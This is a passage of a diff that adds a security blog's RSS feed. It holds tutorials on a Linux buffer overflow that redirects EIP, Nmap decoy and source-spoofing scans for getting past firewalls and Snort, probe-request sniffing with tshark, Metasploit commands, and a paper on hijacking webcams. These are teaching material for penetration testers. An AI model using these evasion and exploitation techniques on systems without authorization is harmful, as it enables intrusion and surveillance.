+correct idea right now, but for the sake of running the noexec function
+we need its memory address).</p>
+
+<pre><code>#gdb ./rofl
+</code></pre>
+
+<p>The above command will run the program in GDB. To find the starting
+address of the <code>noexec()</code> function we need to input a simple command which
+is <code>disassemble</code> followed by the name of the function as follows:</p>
+
+<pre><code>(gdb) disas noexec**
+</code></pre>
+
+<p>this command will output the following-
+<p align="center">
+<a href="/images/2014-10-27-exploit-writing-series-tutorial-1-buffer-overflow-on-linux-2.png"><img src="/images/thumbnails/2014-10-27-exploit-writing-series-tutorial-1-buffer-overflow-on-linux-2.png" alt="" /></a>
+</p>
+Don&rsquo;t get scared! for Now, we only need the address of the first
+instruction which is <code>0x0804847c</code>.</p>
+
+<p>Next, we simply need to input this address after 54 A characters and this will overwrite the memory from where EIP will load a value resulting in altering the flow of the program according to our needs.</p>
+
+<p>Let&rsquo;s test it out:
+Keeping it simple, we will supply 54 A&rsquo;s and the address in Little
+endian format which is to reverse the bytes (<strong>For Example</strong>:split the bytes <code>08 04
+84 7c</code> to <code>7c 84 04 08</code>).
+<p align="center">
+<a href="/images/2014-10-27-exploit-writing-series-tutorial-1-buffer-overflow-on-linux-3.png"><img src="/images/thumbnails/2014-10-27-exploit-writing-series-tutorial-1-buffer-overflow-on-linux-3.png" alt="" /></a>
+</p>
+We can see that after outputting the input, noexec function runs thus
+outputting <code>This Function Does Not Execute</code>.</p>
+
+<p>This tutorial is purely for the newbies in exploit writing. If You liked
+this tutorial, comment your feedback and suggestions.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Fixing SickFuzz for Kali Linux</title>
+            <link>/posts/2014/09/fixing-sickfuzz-for-kali-linux/</link>
+            <pubDate>Sat, 27 Sep 2014 15:05:00 +0530</pubDate>
+            
+            <guid>/posts/2014/09/fixing-sickfuzz-for-kali-linux/</guid>
+            <description>SickFuzz is a fuzzer for web applications and has always been a script which i miss the most on Kali linux. Let us see how we can fix it to run on Kali Systems-
+Download the script from this Link and try to execute it. The First Error would be:  And probably the second one would be:  To Fix these errors, we need to make the following changes in the spike and the fpath variables.</description>
+            <content type="html"><![CDATA[<p>SickFuzz is a fuzzer for web applications and has always been a script
+which i miss the most on Kali linux. Let us see how we can fix it to run
+on Kali Systems-</p>
+
+<p>Download the script from this <a href="http://code.google.com/p/sickfuzz/" target="_blank">Link</a>
+and try to execute it.
+The First Error would be:
+<p align="center">
+<a href="/images/2014-09-27-fixing-sickfuzz-for-kali-linux-error1.png"><img src="/images/thumbnails/2014-09-27-fixing-sickfuzz-for-kali-linux-error1.png" alt="" /></a>
+</p>
+And probably the second one would be:
+<p align="center">
+<a href="/images/2014-09-27-fixing-sickfuzz-for-kali-linux-error2.png"><img src="/images/thumbnails/2014-09-27-fixing-sickfuzz-for-kali-linux-error2.png" alt="" /></a>
+</p></p>
+
+<p>To Fix these errors, we need to make the following changes in the
+<code>spike</code> and the <code>fpath</code> variables. However, fpath variable is the
+path of the <code>sickfuzz.py</code> file.
+<p align="center">
+<a href="/images/2014-09-27-fixing-sickfuzz-for-kali-linux-fix.png"><img src="/images/thumbnails/2014-09-27-fixing-sickfuzz-for-kali-linux-fix.png" alt="" /></a>
+</p>
+As soon as you fix and restart <code>sickfuzz.py</code>, it works like charm-
+<p align="center">
+<a href="/images/2014-09-27-fixing-sickfuzz-for-kali-linux-sickfuzz.png"><img src="/images/thumbnails/2014-09-27-fixing-sickfuzz-for-kali-linux-sickfuzz.png" alt="" /></a>
+</p>
+Happy Fuzzing :)</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Simplest Command to Fetch SSIDs Around You</title>
+            <link>/posts/2014/09/simplest-command-to-fetch-ssids-around-you/</link>
+            <pubDate>Fri, 26 Sep 2014 19:26:00 +0530</pubDate>
+            
+            <guid>/posts/2014/09/simplest-command-to-fetch-ssids-around-you/</guid>
+            <description>Today we will discuss how we can easily capture network SSIDs from the various devices around you.  This will help you find previously connected networks from various devices due to the fact that any wireless enabled device will keep looking for previously connected network after a certain period of time.
+To keep it simple we will simply use tshark the command line sequel for wireshark.
+The first step is to put your wireless card in monitor mode-</description>
+            <content type="html"><![CDATA[<p>Today we will discuss how we can easily capture network SSIDs from the
+various devices around you.
+<p align="center">
+<a href="/images/2014-09-26-simplest-command-to-fetch-ssids-around-you-sniffer_1455727c.jpg"><img src="/images/thumbnails/2014-09-26-simplest-command-to-fetch-ssids-around-you-sniffer_1455727c.jpg" alt="" /></a>
+</p></p>
+
+<p>This will help you find previously connected networks from various devices due to the fact that any wireless enabled device will keep looking for
+previously connected network after a certain period of time.</p>
+
+<p>To keep it simple we will simply use <code>tshark</code> the command line sequel
+for wireshark.</p>
+
+<p>The first step is to put your wireless card in monitor mode-</p>
+
+<pre><code>airmon-ng start wlan0
+</code></pre>
+
+<p> </p>
+
+<p>Next, issue the following command-</p>
+
+<pre><code>tshark -i mon0 -R wlan.fc.type_subtype==0x04 -T fields -E separator=- -e wlan.sa -e wlan_mgt.ssid
+</code></pre>
+
+<p>Lets understand this command, <code>-i</code> denotes the interface to capture
+packets from and since we have put our wireless card in monitor mode, we
+will use <strong>mon0</strong>.</p>
+
+<p>The <code>-R</code> denotes the filter to use, <code>wlan.fc.type_subtype==0x04</code> denotes
+the <code>Probe Request</code> packet which is used for seeking a network
+actively, by the device. We used Hex notation of probe packet that is
+<code>0x04</code>.</p>
+
+<p>Next, to list only the information which we require rather than
+the entire packet we use <code>-T fields</code>. The <code>-E</code> separator denotes the
+character separator between two fields. <code>-e</code> denotes the actual
+fields which we want to display.</p>
+
+<p>Therefore, our command should display something like:</p>
+
+<pre><code>XX:XX:XX:XX:XX:XX-[Network Name]
+</code></pre>
+
+<p>Running this command will output something similar to the following-
+<p align="center">
+<a href="/images/2014-09-26-simplest-command-to-fetch-ssids-around-you-Simple.png"><img src="/images/thumbnails/2014-09-26-simplest-command-to-fetch-ssids-around-you-Simple.png" alt="" /></a>
+</p></p>
+
+<p>This was a simple tutorial but i thought it will be helpful for few
+people who wants to get information about previously connected networks
+from certain devices.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Using Decoys but not only decoys in scanning networks using Nmap</title>
+            <link>/posts/2014/06/using-decoys-but-not-only-decoys-in-scanning-networks-using-nmap/</link>
+            <pubDate>Sun, 29 Jun 2014 18:41:00 +0530</pubDate>
+            
+            <guid>/posts/2014/06/using-decoys-but-not-only-decoys-in-scanning-networks-using-nmap/</guid>
+            <description>In the Previous tutorial, we discussed about evading windows 7 firewall rules. Today, let us discuss about another great capability of Nmap that is decoys.  To evade detection and network presence, Nmap decoys can be used effectively to lessen the chances of being caught. Decoys are those fake IP bots which pretends to be scanning the network and hence, confusing the security administrators to find the real culprit. So, today let us see how we can scan a target using Decoys in Nmap.</description>
+            <content type="html"><![CDATA[<p>In the Previous tutorial, we discussed about <a href="http://www.nipunjaswal.com/2014/06/evading-windows-7-firewall-rules-with-nmap.html" target="_blank">evading windows 7 firewall
+rules</a>.
+Today, let us discuss about another great capability of Nmap that is
+decoys.
+<p align="center">
+<a href="/images/2014-06-29-using-decoys-but-not-only-decoys-in-scanning-networks-using-nmap-irobot.jpg"><img src="/images/thumbnails/2014-06-29-using-decoys-but-not-only-decoys-in-scanning-networks-using-nmap-irobot.jpg" alt="" /></a>
+</p>
+To evade detection and network presence, Nmap decoys can be used
+effectively to lessen the chances of being caught. Decoys are those fake
+IP bots which pretends to be scanning the network and hence, confusing
+the security administrators to find the real culprit. So, today let us
+see how we can scan a target using Decoys in Nmap. For this tutorial we
+will use the target operating system as Windows 7 and we will run Snort
+to detect network packets. Snort is a common open source IDS
+implementation-
+<p align="center">
+<a href="/images/2014-06-29-using-decoys-but-not-only-decoys-in-scanning-networks-using-nmap-nmaponlydecoys.png"><img src="/images/thumbnails/2014-06-29-using-decoys-but-not-only-decoys-in-scanning-networks-using-nmap-nmaponlydecoys.png" alt="" /></a>
+</p>
+we just performed a service scan with nmap on the target with two decoys
+that are <code>192.134.122.133</code> and <code>192.134.55.66</code> on port 21. We can see the
+port open but let us see on the target side that what amount of traffic
+we generated-
+<p align="center">
+<a href="/images/2014-06-29-using-decoys-but-not-only-decoys-in-scanning-networks-using-nmap-decoyswithoriginal.png"><img src="/images/thumbnails/2014-06-29-using-decoys-but-not-only-decoys-in-scanning-networks-using-nmap-decoyswithoriginal.png" alt="" /></a>
+</p>
+As we can clearly see that we have the decoys who are scanning the
+target. But, we also have our original IP address listed there. However,
+this lessens the chances of getting caught but not a complete evade.
+Also, an important thing to mention here is that in a Service discovery
+scan, Nmap will try to fetch the banner of the target port from the
+original IP address which makes it more catchy. Therefore, let us see
+another approach of using Nmap decoys with IP Spoofing and analyze the
+results-
+<p align="center">
+<a href="/images/2014-06-29-using-decoys-but-not-only-decoys-in-scanning-networks-using-nmap-spoofnmap.png"><img src="/images/thumbnails/2014-06-29-using-decoys-but-not-only-decoys-in-scanning-networks-using-nmap-spoofnmap.png" alt="" /></a>
+</p>
+Let us now check the target Snort logs and see if the original IP
+address is listed there or not-
+<p align="center">
+<a href="/images/2014-06-29-using-decoys-but-not-only-decoys-in-scanning-networks-using-nmap-withspoof.png"><img src="/images/thumbnails/2014-06-29-using-decoys-but-not-only-decoys-in-scanning-networks-using-nmap-withspoof.png" alt="" /></a>
+</p>
+Bang! we can see that there is no listing of our original IP address
+there. Hence, evading the catch completely. Therefore, decoys lessens
+the chances of being caught and does it even better when used in
+conjunction with IP spoofing. This tutorial is recommended to use under
+a LAN environment or on an onsite testing project.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Evading Windows 7 Firewall rules with Basic Ninja Scanning using Nmap</title>
+            <link>/posts/2014/06/evading-windows-7-firewall-rules-with-basic-ninja-scanning-using-nmap/</link>
+            <pubDate>Fri, 27 Jun 2014 03:19:00 +0530</pubDate>
+            
+            <guid>/posts/2014/06/evading-windows-7-firewall-rules-with-basic-ninja-scanning-using-nmap/</guid>
+            <description>Today, let us talk about Firewall rules and how we can evade them. However, i will be producing more advanced and complex tutorials for ninja scanning as well. OK, let us talk about a basic ninja scan which is required in the following scenario-
+Target is a colleague in the neighborhood who is running on Windows 7, Runs a Version of an FTP server on port 21 and 990(secured) and lastly has blocked our IP address as well.</description>
+            <content type="html"><![CDATA[<p>Today, let us talk about Firewall rules and how we can evade them.
+However, i will be producing more advanced and complex tutorials for
+ninja scanning as well. OK, let us talk about a basic ninja scan which is
+required in the following scenario-</p>
+
+<p><strong><em>Target is a colleague in the neighborhood who is running on Windows 7, Runs a Version of an FTP server on port 21 and 990(secured) and lastly has blocked our IP address as well. Our task is to evade the protection mechanisms that are the Windows 7 firewall based rules.</em></strong></p>
+
+<p>To create a self test environment, you need:</p>
+
+<ul>
+<li>Windows 7 up and running in VMware or on a different machine</li>
+<li>A Firewall rule in &ldquo;Inbound Connections&rdquo; which Blocks our IP address</li>
+<li>Any Linux configured with Nmap</li>
+</ul>
+
+<p>OK! So let us first run a simple Nmap scan without any rule in the
+firewall and check what is the output:-
+<p align="center">
+<a href="/images/2014-06-27-evading-windows-7-firewall-rules-with-basic-ninja-scanning-using-nmap-nmapscanwithoutfirewall.png"><img src="/images/thumbnails/2014-06-27-evading-windows-7-firewall-rules-with-basic-ninja-scanning-using-nmap-nmapscanwithoutfirewall.png" alt="" /></a>
+</p>
+Providing the simple command <em>nmap 192.168.193.128</em> shows the output in
+the above screenshot. Everything seems to be OK! we are able to make a
+connection with ease. let us now create a firewall rule to block the
+remote address <strong>192.168.193.1(Attacker&rsquo;s OS IP/Our IP)</strong> -
+<p align="center">
+<a href="/images/2014-06-27-evading-windows-7-firewall-rules-with-basic-ninja-scanning-using-nmap-Firewall+Rule.png"><img src="/images/thumbnails/2014-06-27-evading-windows-7-firewall-rules-with-basic-ninja-scanning-using-nmap-Firewall+Rule.png" alt="" /></a>
+</p></p>
+
+<p>The first rule blocks our IP address which is <strong>192.168.193.1</strong> Let us
+now re-scan the target and see that if the firewall is blocking us now
+or not?
+<p align="center">
+<a href="/images/2014-06-27-evading-windows-7-firewall-rules-with-basic-ninja-scanning-using-nmap-nmapscanwithfirewall.png"><img src="/images/thumbnails/2014-06-27-evading-windows-7-firewall-rules-with-basic-ninja-scanning-using-nmap-nmapscanwithfirewall.png" alt="" /></a>
+</p>
+**
+&ldquo;All 1000 ports are filtered&rdquo;** firewall is working pretty well huh? :P
+let us also check what Wireshark denotes running this scan-
+<p align="center">
+<a href="/images/2014-06-27-evading-windows-7-firewall-rules-with-basic-ninja-scanning-using-nmap-nmapnoacknowledgements.png"><img src="/images/thumbnails/2014-06-27-evading-windows-7-firewall-rules-with-basic-ninja-scanning-using-nmap-nmapnoacknowledgements.png" alt="" /></a>
+</p></p>
+
+<p>All SYN packets from the very first packet till the end of the scan&hellip;.
+so what this means? yeah you guessed it right no ACKs. Therefore, Nmap
+shows all ports filtered.</p>
+
+<p>Let us now overcome this situation by using <strong>-S</strong> switch in Nmap which
+helps in spoofing the originating address as follows-
+<p align="center">
+<a href="/images/2014-06-27-evading-windows-7-firewall-rules-with-basic-ninja-scanning-using-nmap-nmapscanwithfirewallrule.png"><img src="/images/thumbnails/2014-06-27-evading-windows-7-firewall-rules-with-basic-ninja-scanning-using-nmap-nmapscanwithfirewallrule.png" alt="" /></a>
+</p></p>
+
+<p>Let us analyze the above command, we used <code>-sS</code> to denote a Stealth
+Scan/Half open Scan. Next, we used <code>-e</code> to denote the interface name
+which in my case was <strong>vmnet8</strong> because I used it in VMware Player(eth0)
+in case of machine being a different one). Next, <code>-S</code> to supply an
+address to spoof and 21,990 using <code>-p</code> switch to denote the port
+numbers. we can see that some error messages are generated but its
+alright, it works fine. let us cross check its functioning using
+Wireshark-
+<p align="center">
+<a href="/images/2014-06-27-evading-windows-7-firewall-rules-with-basic-ninja-scanning-using-nmap-wiresharkblockage.png"><img src="/images/thumbnails/2014-06-27-evading-windows-7-firewall-rules-with-basic-ninja-scanning-using-nmap-wiresharkblockage.png" alt="" /></a>
+</p>
+<strong>Bingo!</strong> we were able to spoof the address with ease and we can also see
+the SYN-ACKs sent back from the target to the spoofed address which
+doesn&rsquo;t exist actually :P</p>
+
+<p>This concludes our most basic ninja scanning tutorial to evade a
+firewall rule of Windows 7. Stay tuned for more tutorials. Additionally,
+Refer to my book <a href="http://www.packtpub.com/mastering-metasploit/book" target="_blank">Mastering
+Metasploit</a> to learn
+how to scan a hidden network using a compromised host.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>What was Western Union Private Exploit</title>
+            <link>/posts/2014/03/what-was-western-union-private-exploit/</link>
+            <pubDate>Mon, 31 Mar 2014 19:24:00 +0530</pubDate>
+            
+            <guid>/posts/2014/03/what-was-western-union-private-exploit/</guid>
+            <description>Western Union is a popular money transfer service. Last year our team &amp;ldquo;Cyber-ROG&amp;rdquo; found a password reset bug in the official site of western union. People on many popular forums claimed to have the password reset bug for western union, which was considered as a popular fake on various forums by some popular members.  Team Cyber-ROG found the Password Reset Bug and reported it to the western union officials. But the company, instead of acknowledging the work done, they patched the bug without even replying to the disclosure mail.</description>
+            <content type="html"><![CDATA[<p><strong>Western Union</strong> is a popular money transfer service. Last year our
+team &ldquo;Cyber-ROG&rdquo; found a password reset bug in the official site of
+western union.
+People on many popular forums claimed to have the password reset bug for
+western union, which was considered as a popular fake on various forums
+by some popular members.
+<p align="center">
+<a href="/images/2014-03-31-what-was-western-union-private-exploit-WesternUnion.jpg"><img src="/images/thumbnails/2014-03-31-what-was-western-union-private-exploit-WesternUnion.jpg" alt="" /></a>
+</p>
+Team Cyber-ROG found the <strong>Password Reset Bug</strong> and reported it to the
+western union officials. But the company, instead of acknowledging the work done, they patched the bug without even replying to the disclosure
+mail.</p>
+
+<p>Check out the POC video of the exploit:</p>
+
+<p><em><strong>Unfortunately, Youtube Deleted the Video</strong></em></p>
+
+<p>Researchers must be acknowledged for their findings. But some of the
+companies do not take this seriously. Hence, Full Disclosure to these
+kind of bugs are required.</p>
+
+<p>Cyber-ROG is composed of highly skilled researchers from around the
+globe. Want to show respect? like the facebook page
+<a href="https://www.facebook.com/CyberReloadedOffensiveGangstas" target="_blank">here</a></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Why to get a C|EH Certification</title>
+            <link>/posts/2014/03/why-to-get-a-ceh-certification/</link>
+            <pubDate>Sun, 30 Mar 2014 22:45:00 +0530</pubDate>
+            
+            <guid>/posts/2014/03/why-to-get-a-ceh-certification/</guid>
+            <description>Hey Folks, let us today discuss about C|EH certification and discuss why it&amp;rsquo;s always an upper hand to get one, rather than a local company based certification.  C|EH is an IT security certification by EC-COUNCIL and has been more than a standard rather than a certification. what it means is that C|EH is almost mandatory in all the IT security jobs out there.
+I have seen so many people quarrel on the subject that &amp;ldquo;C|EH course doesn&amp;rsquo;t provide knowledge&amp;rdquo;.</description>
+            <content type="html"><![CDATA[<p>Hey Folks,
+let us today discuss about
+<a href="http://www.eccouncil.org/Certification/certified-ethical-hacker" target="_blank">C|EH</a>
+certification and discuss why it&rsquo;s always an upper hand to get one,
+rather than a local company based certification.
+<p align="center">
+<a href="../images/2014-03-30-why-to-get-a-c-eh-certification-cartoon-ceh.png"><img src="/images/thumbnails/2014-03-30-why-to-get-a-c-eh-certification-cartoon-ceh.png" alt="" /></a>
+</p>
+C|EH is an IT security certification by
+<a href="http://www.eccouncil.org/" target="_blank">EC-COUNCIL</a> and has been more than a
+standard rather than a certification. what it means is that C|EH is
+almost mandatory in all the IT security jobs out there.</p>
+
+<p>I have seen so many people quarrel on the subject that &ldquo;C|EH course
+doesn&rsquo;t provide knowledge&rdquo;. what i suggest is that C|EH provides a base
+to all security subjects. Hence, it&rsquo;s considered boring. but mind it
+whenever you need to apply to a job, you need this certification in your
+bag. C|EH is widely accepted everywhere in the world.</p>
+
+<p>Suppose, when you type in &ldquo;ceh&rdquo; in linkedin. you will find that most of
+the security jobs require C|EH certification-
+<p align="center">
+<a href="/images/2014-03-30-why-to-get-a-c-eh-certification-yo.PNG"><img src="/images/thumbnails/2014-03-30-why-to-get-a-c-eh-certification-yo.PNG" alt="" /></a>
+</p>
+I did C|EH in 2011. Throughout my course, i found that C|EH mostly
+covers various topics and throw light on the basics of every topic that
+includes- Wireless hacking, Basics of web application hacking, reverse
+engineering, phases of testing and cryptography.</p>
+
+<p>C|EH exam is generally conducted by Prometric in india. CEH v8 exam
+includes 125 Multiple choice questions and require the students to score
+<code>70%</code> marks.</p>
+
+<p>I would say, C|EH exam is really easy to pass as most of the freely
+available exam preparation guides contain all the questions that are
+mostly included in the exams.</p>
+
+<p>😄 <strong>Final Verdict</strong>:
+&gt;If you are a complete beginner go for C|EH to cover
+&gt; basics of most of the technologies. however, if you are an experienced
+&gt; campaigner go for C|EH as a vital asset to fetch a leading job in the
+&gt; IT security industry.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Coding a Simple Wordpress Version Scanner In Metasploit</title>
+            <link>/posts/2014/01/coding-a-simple-wordpress-version-scanner-in-metasploit/</link>
+            <pubDate>Thu, 02 Jan 2014 04:24:00 +0530</pubDate>
+            
+            <guid>/posts/2014/01/coding-a-simple-wordpress-version-scanner-in-metasploit/</guid>
+            <description>Hey Folks, Check out my Simplest Script for Finding the Wordpress Version in Metasploit.
+This module is intended only to show that how we can code a metasploit module. however, tons of tools out there may work 100 times better than this script. 
+This Module Requires you to set RHOSTS to the Server IP and username of the website as USER.
+Suppose, a website is running wordpress, ping the website and grab the IP, open the website and browse to find the username at /wp-includes/admin-bar.</description>
+            <content type="html"><![CDATA[<p><p align ="justify">
+Hey Folks,  Check out my Simplest Script for Finding the Wordpress Version in
+Metasploit.</p>
+
+<p>This module is intended only to show that how we can code a metasploit
+module. however, tons of tools out there may work 100 times better than
+this script.
+</p>
+<a href="/images/2014-01-02-coding-a-simple-wordpress-version-scanner-in-metasploit-apexword2.png"><img src="/images/thumbnails/2014-01-02-coding-a-simple-wordpress-version-scanner-in-metasploit-apexword2.png" alt="" /></a></p>
+
+<p>This Module Requires you to set <code>RHOSTS</code> to the Server IP and username of the website as <code>USER</code>.</p>
+
+<p>Suppose, a website is running wordpress, ping the website and grab the IP, open the website and browse to find the username at <code>/wp-includes/admin-bar.php</code> or <code>/wp-includes/user.php</code> file by copying the username from the path which might look similar to <code>/home/nipun/www/</code>. in
+this case <code>nipun</code> is the username.</p>
+
+<p>Now, set both of the parameters, which are <code>RHOSTS</code> and <code>USER</code>. Now, run the
+script. You should be able to find the Version of Wordpress running.</p>
+
+<p>Script URL :-
+<a href="https://github.com/nipunjaswal/Metasploit/blob/master/Apex_Wordpress_Detector.rb" target="_blank">Download From
+Github</a></p>
+
+<p>Please Comment If you Like this Post and Want more tutorials on Coding
+Metasploit Exploits, Modules etc.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>4 Great Metasploit Variables and Commands</title>
+            <link>/posts/2013/12/4-great-metasploit-variables-and-commands/</link>
+            <pubDate>Sun, 29 Dec 2013 02:54:00 +0530</pubDate>
+            
+            <guid>/posts/2013/12/4-great-metasploit-variables-and-commands/</guid>
+            <description>Hey Guys, Metasploit has got a tons of functions and to master each and everything can be really difficult. you may be familiar with commands such as- set, use, show, exploit, etc and variables such as payload,exploit etc.  but metasploit is much more than that. i am going to list 4 great commands and variables that can be really helpful while you are performing penetration testing with Metasploit.
+ ConsoleLogging:- Supply the command as,</description>
+            <content type="html"><![CDATA[<p>Hey Guys,
+Metasploit has got a tons of functions and to master each and everything
+can be really difficult. you may be familiar with commands such as- set,
+use, show, exploit, etc and variables such as payload,exploit etc.
+<p align="center">
+<a href="/images/2013-12-29-4-great-metasploit-variables-and-commands-metasploit-logo.png"><img src="/images/thumbnails/2013-12-29-4-great-metasploit-variables-and-commands-metasploit-logo.png" alt="" /></a>
+</p>
+but metasploit is much more than that. i am going to list 4 great
+commands and variables that can be really helpful while you are
+performing penetration testing with Metasploit.</p>
+
+<ol>
+<li><p><strong>ConsoleLogging:</strong>- Supply the command as,</p>
+
+<pre><code>msf&gt;set ConsoleLogging true
+</code></pre></li>
+</ol>
+
+<p>will turn on the logging feature of metasploit. so you will get the entire list of commands you have typed in.</p>
+
+<p>Directory for Log Storage: <code>~/.msf4/logs</code></p>
+
+<ol>
+<li><p><strong>SessionLogging:</strong>- Supply the command as,</p>
+
+<pre><code>msf&gt;set SessionLogging true
+</code></pre></li>
+</ol>
+
+<p>this command will help you log the information from the sessions we have
+gained on the target system through sucessful exploitation</p>
+
+<p>Directory for Log Storage: <code>~/.msf4/logs/sessions/</code></p>
+
+<ol>
+<li><p><strong>Info:</strong>- Supply the command as,</p>
+
+<pre><code>msf&gt; info exploit/windows/smb/ms08_067_netapi
+</code></pre></li>
+</ol>
+
+<p>this command will help you fin information related to a module in
+metasploit.</p>
+
+<ol>
+<li><p><strong>Advanced:</strong>- Supply the command as,</p>
+
+<pre><code>msf(ms08_067_netapi)&gt; show advanced
+</code></pre></li>
+</ol>
+
+<p>this command will show us with all the advanced options that can be set
+for a particular module in metasploit.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Blind Date With your Girlfriend</title>
+            <link>/posts/2013/12/blind-date-with-your-girlfriend/</link>
+            <pubDate>Mon, 23 Dec 2013 18:34:00 +0530</pubDate>
+            
+            <guid>/posts/2013/12/blind-date-with-your-girlfriend/</guid>
+            <description>Hey Buddies,
+I have Written this research paper back in 2011-12, this was my first ever research paper. and i presented it in HATCON-LPU chapter. This Research paper focuses on methods that how can a system&amp;rsquo;s webcam can be hacked by the attacker using metasploit.
+You can Download the Entire paper from:- PacketStorm
+I hope you will enjoy reading it.</description>
+            <content type="html"><![CDATA[<p>Hey Buddies,</p>
+
+<p>I have Written this research paper back in 2011-12, this was my first
+ever research paper. and i presented it in HATCON-LPU chapter.
+<p align="center">
+<img src="/images/thumbnails/2013-12-23-blind-date-with-your-girlfriend-161506607.png" alt="" />
+</p>
+This Research paper focuses on methods that how can a system&rsquo;s webcam
+can be hacked by the attacker using metasploit.</p>
+
+<p>You can Download the Entire paper from:-
+<a href="http://packetstormsecurity.com/files/111659/Blind-Date-With-Your-Girlfriend.html" target="_blank">PacketStorm</a></p>
+
+<p>I hope you will enjoy reading it.</p>
+]]></content>
+        </item>
+        
+    </channel>
+</rss>
